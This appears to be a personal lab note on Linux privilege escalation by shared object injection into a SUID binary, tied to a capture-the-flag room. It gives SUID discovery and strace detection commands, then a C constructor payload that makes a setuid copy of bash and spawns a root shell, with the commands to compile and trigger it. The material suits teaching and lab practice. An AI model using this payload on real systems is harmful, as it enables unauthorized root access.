#Linux #PrivEsc #SUID #SharedObjectInjection #GTFOBins #sudo 

# Shared Object Injection
#SharedObjectInjection
## **Detection**
Linux VM

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries. e.g. `/usr/bin/chsh` SEARCH [GTFOBins](https://gtfobins.github.io/#+suid) 
3. In command line type:
`strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
4. From the output, notice that a .so file is missing from a writable directory.

## **Exploitation**
Linux VM

5. In command prompt type: `mkdir /home/user/.config`
6. In command prompt type: `cd /home/user/.config`
7. Open a text editor and type:
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

8. Save the file as `libcalc.c`
9. In command prompt type:
`gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`
10. In command prompt type: `/usr/local/bin/suid-so`
11. In command prompt type: `id`

---
# CTF Challenge

[[VulnUniversity - THM]]

---
